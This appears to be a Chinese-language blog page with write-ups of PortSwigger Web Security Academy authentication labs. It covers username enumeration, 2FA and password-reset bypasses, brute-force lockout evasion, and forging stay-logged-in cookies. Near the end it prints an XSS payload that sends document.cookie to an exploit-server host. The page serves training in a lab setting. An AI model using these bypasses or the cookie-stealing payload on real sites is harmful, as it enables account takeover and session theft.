<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-PortSwigger/web-security/身份验证漏洞" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">身份验证漏洞 | C0rr3ct</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://C0rr3c7.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://C0rr3c7.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://C0rr3c7.github.io/docs/PortSwigger/web-security/身份验证漏洞"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="身份验证漏洞 | C0rr3ct"><meta data-rh="true" name="description" content="Authentication vulnerabilities"><meta data-rh="true" property="og:description" content="Authentication vulnerabilities"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://C0rr3c7.github.io/docs/PortSwigger/web-security/身份验证漏洞"><link data-rh="true" rel="alternate" href="https://C0rr3c7.github.io/docs/PortSwigger/web-security/身份验证漏洞" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://C0rr3c7.github.io/docs/PortSwigger/web-security/身份验证漏洞" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="C0rr3ct RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="C0rr3ct Atom Feed">





<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/styles.aff420c1.css">
<script src="/assets/js/runtime~main.dcbf6bb1.js" defer="defer"></script>
<script src="/assets/js/main.2fdee944.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">C0rr3rt</b></a><a class="navbar__item navbar__link" href="/docs/HackMyVm/">HackMyVm</a><a class="navbar__item navbar__link" href="/docs/VulnHub/">VulnHub</a><a class="navbar__item navbar__link" href="/docs/HackTheBox/">HackTheBox</a><a class="navbar__item navbar__link" href="/docs/category/vulnstack">VulnStack</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/PortSwigger/">PortSwigger</a><a class="navbar__item navbar__link" href="/docs/category/玄机">应急响应</a><a class="navbar__item navbar__link" href="/docs/CTF/">CTF</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/about">关于</a><a class="navbar__item navbar__link" href="/blog">Blog</a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="搜索" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/PortSwigger/">PortSwigger</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/web-security">web-security</a><button aria-label="折叠侧边栏分类 &#x27;web-security&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/API测试">API测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/JWT">JWT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/SQL注入">SQL注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/SSRF">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/XSS">XSS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/XXE">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/信息泄露">信息泄露</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/命令执行">命令执行</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/文件上传">文件上传</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/路径遍历">路径遍历</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/PortSwigger/web-security/身份验证漏洞">身份验证漏洞</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/web-security"><span itemprop="name">web-security</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">身份验证漏洞</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>身份验证漏洞</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="authentication-vulnerabilities">Authentication vulnerabilities<a href="#authentication-vulnerabilities" class="hash-link" aria-label="Authentication vulnerabilities的直接链接" title="Authentication vulnerabilities的直接链接">​</a></h2>
<p>身份验证漏洞可能允许攻击者访问敏感数据和功能</p>
<p><img decoding="async" loading="lazy" alt="password-reset-poisoning" src="/assets/images/password-reset-poisoning-0da0aef0d31a887a225f45149f8251eb.svg" width="754" height="433" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="什么是身份验证">什么是身份验证<a href="#什么是身份验证" class="hash-link" aria-label="什么是身份验证的直接链接" title="什么是身份验证的直接链接">​</a></h2>
<p>身份验证是验证用户或客户端身份的过程。网站可能会暴露给任何连接到 Internet 的人。这使得强大的<strong>身份验证机制</strong>成为有效的 Web 安全不可或缺的一部分。</p>
<p>身份验证主要有三种类型：</p>
<ul>
<li>你知道的信息，例如密码或安全问题的答案。这些有时称为 “知识因子”。</li>
<li>你拥有的东西，这是一个物理对象，例如手机或证券令牌。这些有时被称为“占有因素”。</li>
<li>你是某事或某事。例如，您的生物特征或行为模式。这些有时被称为“固有因素”。</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞实验">漏洞实验<a href="#漏洞实验" class="hash-link" aria-label="漏洞实验的直接链接" title="漏洞实验的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="枚举用户名和密码">枚举用户名和密码<a href="#枚举用户名和密码" class="hash-link" aria-label="枚举用户名和密码的直接链接" title="枚举用户名和密码的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" alt="image-20250504153513280" src="/assets/images/image-20250504153513280-75db7468e02569dfd077c99392a00edd.png" width="1866" height="405" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2fa双重验证简单绕过">2FA（双重验证）简单绕过<a href="#2fa双重验证简单绕过" class="hash-link" aria-label="2FA（双重验证）简单绕过的直接链接" title="2FA（双重验证）简单绕过的直接链接">​</a></h3>
<p>自己的凭据： <code>wiener:peter</code></p>
<p>受害者的凭据： <code>carlos:montoya</code></p>
<p>登录自己的账户，发现需要输入安全码</p>
<p><img decoding="async" loading="lazy" alt="image-20250504155653765" src="/assets/images/image-20250504155653765-f583b0df69df957a65618a5da13b6451.png" width="1397" height="586" class="img_ev3q"></p>
<p>打开自己的邮箱，查看安全码</p>
<p><img decoding="async" loading="lazy" alt="image-20250504155740406" src="/assets/images/image-20250504155740406-b363b94b7e7bf6e290dd382808533449.png" width="1583" height="513" class="img_ev3q"></p>
<p>登录成功，跳转到<code>/my-account?id=wiener</code></p>
<p><img decoding="async" loading="lazy" alt="image-20250504155823354" src="/assets/images/image-20250504155823354-7b55fbcb8392523e713d5438c2aa4614.png" width="1426" height="832" class="img_ev3q"></p>
<p>尝试登录受害者账户，到需要输入安全码时，修改url为<code>/my-account?id=carlos</code></p>
<p><img decoding="async" loading="lazy" alt="image-20250504155942974" src="/assets/images/image-20250504155942974-dcff11502c415f9847c26bb58d38a5d3.png" width="1412" height="559" class="img_ev3q"></p>
<p>成功绕过二次验证</p>
<p><img decoding="async" loading="lazy" alt="image-20250504160105153" src="/assets/images/image-20250504160105153-197f42abe611d193213cf1d973edf45c.png" width="1319" height="481" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="密码重置逻辑错误">密码重置逻辑错误<a href="#密码重置逻辑错误" class="hash-link" aria-label="密码重置逻辑错误的直接链接" title="密码重置逻辑错误的直接链接">​</a></h3>
<p>自己的凭据: <code>wiener:peter</code></p>
<p>受害者的用户名: <code>carlos</code></p>
<p>点击忘记密码，填写自己的用户名</p>
<p>收到重置密码邮件</p>
<p><img decoding="async" loading="lazy" alt="image-20250504160556251" src="/assets/images/image-20250504160556251-93bd54c4dba22cc7111f8a4e9082ccc2.png" width="1637" height="521" class="img_ev3q"></p>
<p>访问链接，输入新密码，查看数据包</p>
<p><img decoding="async" loading="lazy" alt="image-20250504161233156" src="/assets/images/image-20250504161233156-e008f63ca0a6d914ec739a27ad119f66.png" width="1483" height="636" class="img_ev3q"></p>
<p>修改用户名为<code>carlos</code></p>
<p>成功修改密码，登录成功</p>
<p><img decoding="async" loading="lazy" alt="image-20250504161321095" src="/assets/images/image-20250504161321095-4e69e5aa2a9fe190bd39061cddbfc77d.png" width="1801" height="751" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="根据响应不同枚举用户名">根据响应不同枚举用户名<a href="#根据响应不同枚举用户名" class="hash-link" aria-label="根据响应不同枚举用户名的直接链接" title="根据响应不同枚举用户名的直接链接">​</a></h3>
<p>登录，抓包，枚举用户名</p>
<p><img decoding="async" loading="lazy" alt="image-20250504162741566" src="/assets/images/image-20250504162741566-9716a0fe581fdd4f7e50726506acf13b.png" width="1330" height="598" class="img_ev3q"></p>
<p>匹配关键字</p>
<p><img decoding="async" loading="lazy" alt="image-20250504162858071" src="/assets/images/image-20250504162858071-493ee6e5b5ecd6a8893d78f3e852752c.png" width="1456" height="906" class="img_ev3q"></p>
<p>发现，用户<code>aix</code>，响应中缺少了一个<code>.</code>符号</p>
<p><img decoding="async" loading="lazy" alt="image-20250504162931758" src="/assets/images/image-20250504162931758-ce77fc4ee5e55d710ae553ab8d72d7b6.png" width="1751" height="536" class="img_ev3q"></p>
<p>通过枚举该用户的密码，成功登录</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username=aix&amp;password=matthew</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="根据响应时间枚举用户名">根据响应时间枚举用户名<a href="#根据响应时间枚举用户名" class="hash-link" aria-label="根据响应时间枚举用户名的直接链接" title="根据响应时间枚举用户名的直接链接">​</a></h3>
<p>自己的凭据： <code>wiener：peter</code></p>
<p>将密码设置长一点（100个字符），枚举用户名，用<code>XFF</code>头更改IP地址，防止IP被封锁</p>
<p><img decoding="async" loading="lazy" alt="image-20250504171101534" src="/assets/images/image-20250504171101534-53e05f3ae381f3619b31494e9fb89040.png" width="1758" height="462" class="img_ev3q"></p>
<p>发现用户<code>al</code>和<code>wiener</code>的响应时间大致相同，判断出<code>al</code>是一个有效用户</p>
<p>接着爆破密码</p>
<p><img decoding="async" loading="lazy" alt="image-20250504171224473" src="/assets/images/image-20250504171224473-44376d7e24658d08b8f1cae6737b7298.png" width="1773" height="384" class="img_ev3q"></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">al:123123</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="破解暴力保护ip-封锁">破解暴力保护、IP 封锁<a href="#破解暴力保护ip-封锁" class="hash-link" aria-label="破解暴力保护、IP 封锁的直接链接" title="破解暴力保护、IP 封锁的直接链接">​</a></h3>
<p>如果连续提交 3 个错误的登录信息， IP 将被暂时阻止。但是，请注意，在达到此限制之前，可以通过登录自己的账户来重置失败登录尝试次数的计数器。</p>
<p><img decoding="async" loading="lazy" alt="image-20250505160908723" src="/assets/images/image-20250505160908723-40b0eb70fee8330ae19fb87d85098e69.png" width="1110" height="496" class="img_ev3q"></p>
<p>每爆破一次就登录一次<code>wiener</code>用户，重置失败登录尝试次数</p>
<p><img decoding="async" loading="lazy" alt="image-20250505163056962" src="/assets/images/image-20250505163056962-3c2799d35cc4285482dfa2dfcf5c020c.png" width="1911" height="586" class="img_ev3q"></p>
<p>最终拿到账户密码</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username=carlos&amp;password=joshua</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="通过帐户锁定进行用户名枚举">通过帐户锁定进行用户名枚举<a href="#通过帐户锁定进行用户名枚举" class="hash-link" aria-label="通过帐户锁定进行用户名枚举的直接链接" title="通过帐户锁定进行用户名枚举的直接链接">​</a></h3>
<p>通过多次爆破一个用户，该用户会进行锁定</p>
<p><img decoding="async" loading="lazy" alt="image-20250505204335383" src="/assets/images/image-20250505204335383-bd3a7c107778f5e01a746196597e310a.png" width="1298" height="704" class="img_ev3q"></p>
<p>使用<code>Cluster bomb</code>模式，密码随便填几个（5个以上），发现<code>mysql</code>账户被锁定</p>
<p><img decoding="async" loading="lazy" alt="image-20250505205030563" src="/assets/images/image-20250505205030563-50c75e83233c2db7d74dcca2b5596d7f.png" width="1835" height="723" class="img_ev3q"></p>
<p>然后爆破密码</p>
<p><img decoding="async" loading="lazy" alt="image-20250505205315213" src="/assets/images/image-20250505205315213-bf042c37ae38b81a9d009631763cc74d.png" width="1763" height="615" class="img_ev3q"></p>
<p>发现当账户输入正确密码时，访问错误信息处，是空的。一分钟以后登录用户即可</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2fa-逻辑漏洞">2FA 逻辑漏洞<a href="#2fa-逻辑漏洞" class="hash-link" aria-label="2FA 逻辑漏洞的直接链接" title="2FA 逻辑漏洞的直接链接">​</a></h3>
<p>自己的凭据: <code>wiener:peter</code></p>
<p>受害者的用户名: <code>carlos</code></p>
<p>登录成功以后，找到<code>GET /login2</code>中的cookie值，<code>verify</code>字段表示给该用户生成一个临时<code>2FA code</code></p>
<p><img decoding="async" loading="lazy" alt="image-20250505211528126" src="/assets/images/image-20250505211528126-a2100a0665ef45549aee6b8fb908bea9.png" width="1480" height="816" class="img_ev3q"></p>
<p>将值修改为<code>carlos</code>，为该用户生成一个临时code</p>
<p>然后抓取提交2FA code的数据包，将值修改为<code>carlos</code>，爆破code</p>
<p><img decoding="async" loading="lazy" alt="image-20250505211946234" src="/assets/images/image-20250505211946234-92ba5c71fafafe7937161ad41ea910ed.png" width="1908" height="619" class="img_ev3q"></p>
<p>成功登录<code>carlos</code>用户</p>
<p><img decoding="async" loading="lazy" alt="image-20250505211239837" src="/assets/images/image-20250505211239837-bb69cd59c8306fa1cfe7a240826843f1.png" width="1790" height="779" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="爆破保持登录状态的cookie">爆破保持登录状态的cookie<a href="#爆破保持登录状态的cookie" class="hash-link" aria-label="爆破保持登录状态的cookie的直接链接" title="爆破保持登录状态的cookie的直接链接">​</a></h3>
<p>自己的凭据: <code>wiener:peter</code></p>
<p>受害者的用户名: <code>carlos</code></p>
<p>通过上面的方法直接进行爆破，发现没有特别的响应</p>
<p><img decoding="async" loading="lazy" alt="image-20250505212645169" src="/assets/images/image-20250505212645169-f37e8e80babc4707fc6199daa1431c05.png" width="1764" height="434" class="img_ev3q"></p>
<p>登录自己的账户，勾选保持登录状态</p>
<p><img decoding="async" loading="lazy" alt="image-20250505214208377" src="/assets/images/image-20250505214208377-296a47eecaee839e3f98e1c0082866dc.png" width="1223" height="508" class="img_ev3q"></p>
<p>找到登录后的数据包，发现cookie中的<code>stay-logged-in，</code>为<code>用户名:md5(密码)</code>，然后再base64编码</p>
<p><img decoding="async" loading="lazy" alt="image-20250505214304403" src="/assets/images/image-20250505214304403-21f64afcc75919122cc5c228f6a3c57d.png" width="1864" height="491" class="img_ev3q"></p>
<p>修改<code>/my-account?id=wiener</code>id值，然后爆破<code>stay-logged-in</code></p>
<p>payload处理如下：</p>
<p>首先md5加密密码，添加<code>carlos:</code>前缀，然后base64编码</p>
<p><img decoding="async" loading="lazy" alt="image-20250505214616308" src="/assets/images/image-20250505214616308-5eaa92378d71cb6a0a99c2ab943b0751.png" width="991" height="319" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20250505214731813" src="/assets/images/image-20250505214731813-c1a5fe2bbb67a8d4d8bfb63f37c33216.png" width="1786" height="819" class="img_ev3q"></p>
<p>成功登录</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="离线密码破解">离线密码破解<a href="#离线密码破解" class="hash-link" aria-label="离线密码破解的直接链接" title="离线密码破解的直接链接">​</a></h3>
<p>自己的凭据: <code>wiener:peter</code></p>
<p>受害者的用户名: <code>carlos</code></p>
<p>使用上一关的方法，发现不能失效了</p>
<p><img decoding="async" loading="lazy" alt="image-20250505215301951" src="/assets/images/image-20250505215301951-6b28854af5e0d453e96c1ccec4a0ae1b.png" width="1720" height="670" class="img_ev3q"></p>
<p>这个实验，密码hash存在cookie中，并且有一个xss漏洞在<strong>评论的功能</strong></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;script&gt;document.location=&#x27;//exploit-0aff009f04439b108145ddb00105000a.exploit-server.net/&#x27;+document.cookie&lt;/script&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20250506123751075" src="/assets/images/image-20250506123751075-02e2e8b0f8ff629876a231210057cf93.png" width="1275" height="819" class="img_ev3q"></p>
<p>查看访问日志，成功拿到cookie</p>
<p><img decoding="async" loading="lazy" alt="image-20250506123845069" src="/assets/images/image-20250506123845069-303daf3ec6b102afaeaee60710155922.png" width="1917" height="388" class="img_ev3q"></p>
<p>md5可以解出来</p>
